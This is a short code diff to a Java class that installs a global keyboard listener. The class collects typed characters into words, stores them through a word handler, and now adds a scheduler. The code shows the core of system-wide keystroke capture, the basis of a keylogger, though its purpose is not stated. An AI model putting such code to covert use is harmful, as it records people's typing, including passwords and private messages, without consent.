@@ -11,10 +11,12 @@ public class JHook implements NativeKeyListener {
 
     WordHandler wh;
     StringBuilder word;
+    Scheduler sch;
 
     public JHook(){
         wh = new WordHandler();
         word = new StringBuilder();
+        sch = new Scheduler();
 
         LogManager.getLogManager().reset();
         try {
@@ -60,7 +62,6 @@ public class JHook implements NativeKeyListener {
             wh.addWord(word.toString());
             word.setLength(0); //Clears the buffer
             System.out.println();
-            wh.getWords();
         }
     }
 }
